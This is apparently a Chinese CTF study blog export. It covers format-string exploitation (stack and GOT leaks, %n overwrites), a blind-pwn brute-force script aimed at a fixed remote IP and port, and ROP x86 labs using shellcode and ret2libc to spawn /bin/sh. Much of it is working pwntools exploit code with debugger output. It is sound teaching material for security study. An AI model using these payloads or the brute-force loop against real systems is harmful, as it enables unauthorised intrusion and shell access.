rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr</a></p><p>漏洞利用</p><p>1：程序崩溃<br>因为栈上会有很多权限不足的地址无法进行访问，利用无法访问地址使程序崩溃<br>一般输入多个%s即可<br>2：泄露内存<br>获取某个变量的值，或是某个变量对应的地址<br>例：<br>程序如下：</p><pre><code>#include &lt;stdio.h&gt;int main() {  char s[100];  int a = 1, b = 0x22222222, c = -1;  scanf(&quot;%s&quot;, s);  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);  printf(s);  return 0;}</code></pre><p>简单编译并将防护关闭：gcc -m32 -fno-stack-protector -no-pie -o test test.c<br>（32位，关闭栈溢出防护，PIE）<br>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><p>获取栈变量数值：</p><pre><code>%08x.%08x.%08x00000001.22222222.ffffffff.%08x.%08x.%08xff9645f0.f7ee9410.0804849d</code></pre><p>以上可以看出我们确实得到了3个16进制的数据。我们用gdb继续深入</p><p>首先再printf下断点：<br>gdb-peda$ b printf<br>Breakpoint 1 at 0x8048330<br>继续运行：</p><pre><code>gdb-peda$ rStarting program: /home/hunter/PWN/formal/wiki/test1 %08x.%08x.%08x  //我们还是输入%08x.%08x.%08x回车继续运行，程序停在第一次调用printf处：=&gt; 0xf7e2db60 &lt;printf&gt;:        call   0xf7f11c79   0xf7e2db65 &lt;printf+5&gt;:        add    eax,0x18449b   0xf7e2db6a &lt;printf+10&gt;:        sub    esp,0xc   0xf7e2db6d &lt;printf+13&gt;:        mov    eax,DWORD PTR [eax-0x7c]   0xf7e2db73 &lt;printf+19&gt;:        lea    edx,[esp+0x14]No argument[------------------------------------stack-------------------------------------]0000| 0xffffcfac --&gt; 0x80484ea (&lt;main+100&gt;:    )   //printf函数的返回地址0004| 0xffffcfb0 --&gt; 0x8048593 (&quot;%08x.%08x.%08x.%s\n&quot;) printf函数第一个参数即格式化字符串0008| 0xffffcfb4 --&gt; 0x1   //变量a的地址 （格式化字符串的第一个参数）0012| 0xffffcfb8 (&quot;\&quot;\&quot;\&quot;\&quot;\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%08x.%08x.%08x&quot;)    //变量b，我不知道为啥是这么一大串，理论上是0x222222220016| 0xffffcfbc --&gt; 0xffffffff  //变量c0020| 0xffffcfc0 --&gt; 0xffffcfd0 (&quot;%08x.%08x.%08x&quot;)  该变量是我们输入的格式化字符串对应的地址 0024| 0xffffcfc4 --&gt; 0xffffcfd0 (&quot;%08x.%08x.%08x&quot;)0028| 0xffffcfc8 --&gt; 0xf7fcf410 --&gt; 0x8048278 (&quot;GLIBC_2.0&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 in printf    () from /lib32/libc.so.6gdb-peda$ 继续执行：gdb-peda$ cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08x程序确实输出了每一个变量对应的数值，并停在第二个printf=&gt; 0xf7e2db60 &lt;printf&gt;:    call   0xf7f11c79   0xf7e2db65 &lt;printf+5&gt;:        add    eax,0x18449b   0xf7e2db6a &lt;printf+10&gt;:    sub    esp,0xc   0xf7e2db6d &lt;printf+13&gt;:        mov    eax,DWORD PTR [eax-0x7c]   0xf7e2db73 &lt;printf+19&gt;:        lea    edx,[esp+0x14]No argument[------------------------------------stack-------------------------------------]0000| 0xffffcfbc --&gt; 0x80484f9 (&lt;main+115&gt;:    add    esp,0x10)0004| 0xffffcfc0 --&gt; 0xffffcfd0 (&quot;%08x.%08x.%08x&quot;)0008| 0xffffcfc4 --&gt; 0xffffcfd0 (&quot;%08x.%08x.%08x&quot;)0012| 0xffffcfc8 --&gt; 0xf7fcf410 --&gt; 0x8048278 (&quot;GLIBC_2.0&quot;)0016| 0xffffcfcc --&gt; 0x804849d (&lt;main+23&gt;:    add    ebx,0x1b63)0020| 0xffffcfd0 (&quot;%08x.%08x.%08x&quot;)0024| 0xffffcfd4 (&quot;.%08x.%08x&quot;)0028| 0xffffcfd8 (&quot;x.%08x&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 in printf ()   from /lib32/libc.so.6gdb-peda$ </code></pre><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出：</p><pre><code>gdb-peda$ cContinuing.ffffcfd0.f7fcf410.0804849d[Inferior 1 (process 9574) exited normally]</code></pre><p>想获取栈变量数值，我们一般用%p代替%08x。</p><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p>可以用%n$x来对应栈中第n+1个参数，因为对于printf函数格式化字符串就是栈中第一个参数，而格式化字符串后面的数据就是该格式化字符串内将被替换的参数</p><p>gdb再次深入：</p><pre><code>Starting program: /home/hunter/PWN/formal/wiki/test1 %3$x[----------------------------------registers-----------------------------------]EAX: 0x8048593 (&quot;%08x.%08x.%08x.%s\n&quot;)EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1 ECX: 0x1 EDX: 0xf7fb389c --&gt; 0x0 ESI: 0xf7fb2000 --&gt; 0x1d4d6c EDI: 0x0 EBP: 0xffffd048 --&gt; 0x0 ESP: 0xffffcfac --&gt; 0x80484ea (&lt;main+100&gt;:    add    esp,0x20)EIP: 0xf7e2db60 (&lt;printf&gt;:    call   0xf7f11c79)EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0xf7e2db5b &lt;fprintf+27&gt;:    ret       0xf7e2db5c:    xchg   ax,ax   0xf7e2db5e:    xchg   ax,ax=&gt; 0xf7e2db60 &lt;printf&gt;:    call   0xf7f11c79   0xf7e2db65 &lt;printf+5&gt;:        add    eax,0x18449b   0xf7e2db6a &lt;printf+10&gt;:    sub    esp,0xc   0xf7e2db6d &lt;printf+13&gt;:        mov    eax,DWORD PTR [eax-0x7c]   0xf7e2db73 &lt;printf+19&gt;:        lea    edx,[esp+0x14]No argument[------------------------------------stack-------------------------------------]0000| 0xffffcfac --&gt; 0x80484ea (&lt;main+100&gt;:    add    esp,0x20)0004| 0xffffcfb0 --&gt; 0x8048593 (&quot;%08x.%08x.%08x.%s\n&quot;) //函数参数10008| 0xffffcfb4 --&gt; 0x1    //函数参数20012| 0xffffcfb8 (&quot;\&quot;\&quot;\&quot;\&quot;\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%3$x&quot;)    //函数参数30016| 0xffffcfbc --&gt; 0xffffffff  //函数参数4.。。。。0020| 0xffffcfc0 --&gt; 0xffffcfd0 (&quot;%3$x&quot;)0024| 0xffffcfc4 --&gt; 0xffffcfd0 (&quot;%3$x&quot;)0028| 0xffffcfc8 --&gt; 0xf7fcf410 --&gt; 0x8048278 (&quot;GLIBC_2.0&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 in printf ()   from /lib32/libc.so.6gdb-peda$ 继续：0xf7e2db60 &lt;printf&gt;:    call   0xf7f11c79   0xf7e2db65 &lt;printf+5&gt;:        add    eax,0x18449b   0xf7e2db6a &lt;printf+10&gt;:    sub    esp,0xc   0xf7e2db6d &lt;printf+13&gt;:        mov    eax,DWORD PTR [eax-0x7c]   0xf7e2db73 &lt;printf+19&gt;:        lea    edx,[esp+0x14]No argument[------------------------------------stack-------------------------------------]0000| 0xffffcfbc --&gt; 0x80484f9 (&lt;main+115&gt;:    add    esp,0x10) //第二次调用，返回地址0004| 0xffffcfc0 --&gt; 0xffffcfd0 (&quot;%3$x&quot;)  //函参10008| 0xffffcfc4 --&gt; 0xffffcfd0 (&quot;%3$x&quot;)  // 2   （格式化参数1。。。）0012| 0xffffcfc8 --&gt; 0xf7fcf410 --&gt; 0x8048278 (&quot;GLIBC_2.0&quot;)    //30016| 0xffffcfcc --&gt; 0x804849d (&lt;main+23&gt;:    add    ebx,0x1b63)   //40020| 0xffffcfd0 (&quot;%3$x&quot;)0024| 0xffffcfd4 --&gt; 0x0 0028| 0xffffcfd8 --&gt; 0xf7ffd940 --&gt; 0x0 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 in printf ()   from /lib32/libc.so.6gdb-peda$ 以此判断程序将输出0x804849d：gdb-peda$ cContinuing.804849d[Inferior 1 (process 9897) exited normally]</code></pre><p>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</p><p>小结：</p><pre><code>    利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。    利用 %s 来获取变量所对应地址的内容，只不过有零截断。    利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</code></pre><p>3：泄露任意地址内存<br>有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了</p><p>一般来说我们所读取的变量值都是在栈上的，因为是某个函数的局部变量。</p><p>由于我们可以控制格式化字符串，如果我们知道输出函数调用时我们的格式化字符串是第几个参数就可以构造特定形式来获取某些addr，如：p32（addr）%K$s<br>我们可以用下面的方法确定参数偏移：<br>[tag]%p%p%p%p%p%p…</p><p>如：</p><pre><code>AAAA%p%p%p%p%p%p%p%p00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%pAAAA0xff99da800xf7f814100x804849d0x414141410x702570250x702570250x702570250x70257025</code></pre><p>所以得到参数位置是5，是格式化字符串的第4个参数</p><p>现在我们可以来访问某些函数的地址如scanf函数，首先找到其got地址<br>利用pwntools得：</p><pre><code>from pwn import*sh = process(&quot;test1&quot;)elf = ELF(&quot;test1&quot;)scanf_got = elf.got[&#39;__isoc99_scanf&#39;]print hex(scanf_got)payload = p32(scanf_got) + &#39;%4$s&#39;print payloadgdb.attach(sh)   //进一步调试sh.sendline(payload)sh.recvuntil(&quot;%4$s\n&quot;)print hex(u32(sh.recv()[4:8]))sh.interactive()</code></pre><p>在脚本启动gdb后先finih直到main函数然后在printf下断点。</p><pre><code>=&gt; 0xf7e25b60 &lt;printf&gt;:    call   0xf7f09c79   0xf7e25b65 &lt;printf+5&gt;:        add    eax,0x18449b   0xf7e25b6a &lt;printf+10&gt;:    sub    esp,0xc   0xf7e25b6d &lt;printf+13&gt;:        mov    eax,DWORD PTR [eax-0x7c]   0xf7e25b73 &lt;printf+19&gt;:        lea    edx,[esp+0x14]No argument[------------------------------------stack-------------------------------------]0000| 0xffefdd2c --&gt; 0x80484ea (&lt;main+100&gt;:    add    esp,0x20)0004| 0xffefdd30 --&gt; 0x8048593 (&quot;%08x.%08x.%08x.%s\n&quot;)0008| 0xffefdd34 --&gt; 0x1 0012| 0xffefdd38 (&quot;\&quot;\&quot;\&quot;\&quot;\377\377\377\377P\335\357\377P\335\357\377\020t\374\367\235\204\004\b\024\240\004\b%4$s&quot;)0016| 0xffefdd3c --&gt; 0xffffffff 0020| 0xffefdd40 --&gt; 0xffefdd50 --&gt; 0x804a014 --&gt; 0xf7e38410 (&lt;__isoc99_scanf&gt;:    push   ebp)0024| 0xffefdd44 --&gt; 0xffefdd50 --&gt; 0x804a014 --&gt; 0xf7e38410 (&lt;__isoc99_scanf&gt;:    push   ebp)0028| 0xffefdd48 --&gt; 0xf7fc7410 --&gt; 0x8048278 (&quot;GLIBC_2.0&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0xf7e25b60 in printf ()   from /lib32/libc.so.6gdb-peda$ 可以看到第4个参数确实是scanf的在libc库中的地址在调试结束后的terminal可以得到scanf的地址：0x804a014\x14\x04%4$s[*] running in new terminal: /usr/bin/gdb -q  &quot;./test1&quot; 11351 -x &quot;/tmp/pwn7ki8h7.gdb&quot;[+] Waiting for debugger: Done0xf7d5e410[*] Switching to interactive mode[*] Process &#39;./test1&#39; stopped with exit code 0 (pid 11351)[*] Got EOF while reading in interactive$  </code></pre><p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字(32位4，64位8）长整数倍的地址处，一般来说，类似于下面的这个样子。<br>[padding][addr][padding]</p><p>4：内存覆盖<br>只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值：%n,<br>%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</p><p>程序：</p><pre><code>#include &lt;stdio.h&gt;int a = 123, b = 456;int main() {  int c = 789;  char s[100];  printf(&quot;%p\n&quot;, &amp;c);  scanf(&quot;%s&quot;, s);  printf(s);  if (c == 16) {    puts(&quot;modified c.&quot;);  } else if (a == 2) {    puts(&quot;modified a for a small number.&quot;);  } else if (b == 0x12345678) {    puts(&quot;modified b for a big number!&quot;);  }  return 0;}</code></pre><p>基本构造格式如下：<br>…[overwrite addr]….%[overwrite offset]$n<br>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数<br>步骤：<br>    确定覆盖地址<br>    确定相对偏移<br>    进行覆盖</p><p>确定覆盖地址：首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><p>确定相对偏移：其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()<br>hunter@hunter:~/PWN/formal/wiki$ ./test2<br>0xffebe8ac<br>AAAA%p%p%p%p%p%p%p%p%p<br>AAAA0xffebe8480xf7ef14100x80484bd(nil)0x10x414141410x702570250x702570250x70257025<br>所以是第7 个参数  =》  n为6</p><p>进行覆盖：<br>将c的地址放在n=6，然后利用%n来修改c的值<br>[addr of c]%012d%6$n    //addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p><p><strong>注意：如果地址没有在或者不能放在第一个位置时，要注意我们的地址作为printf的参数是第几个</strong><br><img src="https://s1.ax1x.com/2020/07/05/USf2tO.png" alt=""></p><p>Exp：</p><pre><code>    sh = process(&#39;test2&#39;)    c_addr = int(sh.recvuntil(&#39;\n&#39;, drop=True), 16)  #drop ：是否保留    print hex(c_addr)    payload = p32(c_addr) + &#39;%012d&#39; + &#39;%6$n&#39;    print payload    #gdb.attach(sh)    sh.sendline(payload)    print sh.recv()    sh.interactive()</code></pre><p>覆盖小数字：<br>下面的问题是将a改为2  因为a是全局变量，在data段地址可从ida获取<br>这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。  （或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。）</p><p>我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是：aa%k$naa  刚好占8字节所以我们的地址被挤到第n=8个参数</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><p>.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh</p><p>故而我们可以构造如下的利用代码</p><pre><code>sh = process(&#39;test2&#39;)a_addr = 0x0804A024payload = &#39;aa%8$naa&#39; + p32(a_addr)sh.sendline(payload)print sh.recv()sh.interactive()</code></pre><p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p><p>覆盖大数字<br>我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12</p><p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p><p>.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</p><p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><p>0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12</p><p>这里将构造一个推算代码：（本人不懂）</p><pre><code>def fmt(prev, word, index):    if prev &lt; word:        result = word - prev        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;    elif prev == word:        result = 0    else:        result = 256 + word - prev        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;    fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot;    return fmtstrdef fmt_str(offset, size, addr, target):    payload = &quot;&quot;    for i in range(4):        if size == 4:            payload += p32(addr + i)        else:            payload += p64(addr + i)    prev = len(payload)    for i in range(4):        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)        prev = (target &gt;&gt; i * 8) &amp; 0xff    return payloadpayload = fmt_str(6,4,0x0804A028,0x12345678)</code></pre><pre><code>offset 表示要覆盖的地址最初的偏移size 表示机器字长addr 表示将要覆盖的地址。target 表示我们要覆盖为的目的变量值。</code></pre><p>这其实就是pwntools的一个模块：当要写入很大的数时可以用pwntools的fmtstr模块：我们希望向0x08048000写入值0x10203040，在pwntools里，我们可以用命令fmtstr_payload。<br>payload = fmtstr_payload(6,{0x08048000:0x10203040}) // 即可 ， 6是偏移量。</p><p>详情:<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf进阶-pwn-warmup</title>
      <link href="/2020/05/16/xctf-jin-jie-pwn-warmup/"/>
      <url>/2020/05/16/xctf-jin-jie-pwn-warmup/</url>
      
        <content type="html"><![CDATA[<p>这个提没有附件，被称为盲打，blind pwn<br><img src="https://s1.ax1x.com/2020/05/23/YjvFy9.png" alt=""></p><p>黑箱测试之类的。</p><p>linux连接尝试：<br><img src="https://s1.ax1x.com/2020/05/23/YjviQJ.png" alt=""></p><p>因为没有关键提示，可以从溢出方面下手，这个地址很可能就是后门。</p><p>exp爆破：</p><pre><code>from pwn import *#context.log_level = &#39;debug&#39;addr = 0x40060d    #地址可能是p32 也可能是p64def fuzz(r, num, flag):    #爆破函数 , flag表示有3种可能：p32发送后门，p64发送后门，无效后门。    payload = &#39;a&#39; * num    if flag==1:        payload += p32(addr)    if flag==2:        payload += p64(addr)    r.recvuntil(&quot;&gt;&quot;)    r.sendline(payload)def main():    for i in range(1000):          print(i)        for j in range(3):            try:                r = remote(&quot;101.200.240.241&quot;, 7000)                fuzz(r, i, j)                text = r.recv()                print(&#39;text.len=&#39;+str(len(text))+&#39;text=&#39;+text)                print(&#39;num=&#39;+str(i)+&#39; flag=&#39;+str(j))                r.interactive()            except:            #except为空则try语句中出现任何错误都会执行r.close()                r.close()if __name__ == &#39;__main__&#39;:    main()</code></pre><p>对于循环脚本可用ctr + c 打断无法继续下去的一个循环进行下一个循环</p>]]></content>
      
      
      
        <tags>
            
            <tag> xctf-pwn-hard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP_x86</title>
      <link href="/2020/04/23/rop-x86/"/>
      <url>/2020/04/23/rop-x86/</url>
      
        <content type="html"><![CDATA[<h2 id="ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"><a href="#ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。" class="headerlink" title="ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"></a>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</h2><h3 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h3><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p><p>level1：无防护32位<br>ida伪代码：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>进入vulnerable（危险）函数：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>从char buf （后面的注释）这一段可知其大小大概为0x88+0x10.<br>下面的read函数256u表示允许读入256个字符，显然存在溢出。<br>进入buf：<br><img src="https://s1.ax1x.com/2020/05/23/YvkNbF.png" alt=""><br>所以（下面的没截下来）buf可放入0x88+0x8个字符（140），还可以通过调试进一步验证。</p><h3 id="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"><a href="#那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。" class="headerlink" title="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"></a>那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。</h3><h2 id="调试："><a href="#调试：" class="headerlink" title="调试："></a>调试：</h2><p>在read函数时制造200个字符：<br><img src="https://s1.ax1x.com/2020/05/23/Yvksv6.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkdUJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkWUH.png" alt=""><br>所以140个字符+ret返回地址即可</p><h3 id="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"><a href="#现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）" class="headerlink" title="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"></a>现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）</h3><p>由于各种玄学问题buf正真的地址不是我想的那样，这里我引用蒸米@阿里聚安全的原话：</p><pre><code>  对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。</code></pre><p>解决方法：开启core dump功能。<br>指令：ulimit -c unlimited<br>   sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’</p><p>开启后，当运行程序出现内存错误时，系统会生成一个core dump文件在tmp目录下。然后我们用gdb查看该core文件，来推测buf真正的地址。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkRVe.png" alt=""><br>接下来调试core文件：<br><img src="https://s1.ax1x.com/2020/05/23/Yvk4PA.png" alt=""><br>下面这一步我不太明白为啥是$esp-144得到buf地址。个人觉得应该是-140，如果不正确可以扩大范围<br><img src="https://s1.ax1x.com/2020/05/23/Yvkf5d.png" alt=""><br>将这里的字符串和我们之前造的字符串对比是一致的。所以可以知道我们输入的字符串放在0xffffd000这里。所以buf地址就是0xffffd000.可以写exp了。</p><pre><code>#level1sh = process(&quot;level1&quot;)context(arch=&#39;i386&#39;, os=&#39;linux&#39;, endian=&#39;little&#39;, word_size=32)shellcode = asm(shellcraft.sh())payload = shellcode + &quot;a&quot;*(140-len(shellcode)) + p32(0xffffcff0)#gdb.attach(sh)  ——这里启用的话可以进行调试。sh.sendline(payload)sh.interactive()</code></pre><p><img src="https://s1.ax1x.com/2020/05/23/YvkgbD.png" alt=""><br>成功！！</p><h2 id="level2：NX开启，栈不可执行！"><a href="#level2：NX开启，栈不可执行！" class="headerlink" title="level2：NX开启，栈不可执行！"></a>level2：NX开启，栈不可执行！</h2><p>程序还是一样的就是在编译的时候开其NX保护机制。<br>那么像上面的方法将shellcode填入栈中，再用ret跳转到栈上执行shellcode的方法就不行了。</p><p>小知识：ps指令查看进程（注意pid）<br><img src="https://s1.ax1x.com/2020/05/23/YvkD81.png" alt=""><br>如果你通过sudo cat /proc/[pid]/maps查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。<br><img src="https://s1.ax1x.com/2020/05/23/YvkcDO.png" alt=""></p><h3 id="接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）："><a href="#接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）：" class="headerlink" title="接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）："></a>接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）：</h3><h4 id="我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。"><a href="#我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。" class="headerlink" title="我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。"></a>我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。</h4><p>步骤：<br>首先再main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中。<br>通过print system这个命令来获取system函数在内存中的位置。<br>通过print __libc_start_main这个命令获取libc.so在内存中的起始位置。<br>通过find命令查找/bin/sh这个字符串。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkBCR.png" alt=""><br>图中字符串/bin/sh有两个一个实在libc中的另一个是出题者给的hint（这个在ida中的字符串也可以找到）两个都可以用。<br>可以写exp了：</p><pre><code>from pwn import*#xctfpwn6 == rop level2sh = process(&quot;level2&quot;)systemaddr = 0xf7e19d10binshaddr = 0x804a024ret = 0x804a024   #要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们只需要执行system(&quot;/bin/sh&quot;)函数所以system的返回地址可任意。payload = &quot;a&quot;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)sh.sendline(payload)sh.interactive()</code></pre><p>连接到端口时脚本为：<br>from pwn import*</p><p>context.log_level = ‘debug’  //虽然不是很明白，但加上这个是有点用处的，可以显示一些细节。<br>elf = ELF(“level2”) // elf只是一个名字，level2是本地文件。<br>sysaddr = elf.symbols[‘system’] // .symbols是用来搜寻函数的，此处搜寻system的地址（在本地文件了level2中搜寻）<br><img src="https://s1.ax1x.com/2020/05/23/Yvkrgx.png" alt=""><br>binshaddr = elf.search(“/bin/sh”).next() // .search 找字符串，汇编代码或者某个数值的地址。</p><p><img src="https://s1.ax1x.com/2020/05/23/Yvkw59.png" alt=""></p><p>payload = “a”*140 + p32(sysaddr) + p32(0) + p32(binshaddr)</p><p>sh = remote(“<strong>**</strong>“, port)</p><p>sh.sendline(payload)</p><p>sh.interactive()</p><p>这里由ida字符串查看可知：<br><img src="https://s1.ax1x.com/2020/05/23/YvktDU.png" alt=""></p><p>本地文件里包括system与/bin/sh，所以在使用相关搜索功能时可以查询到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
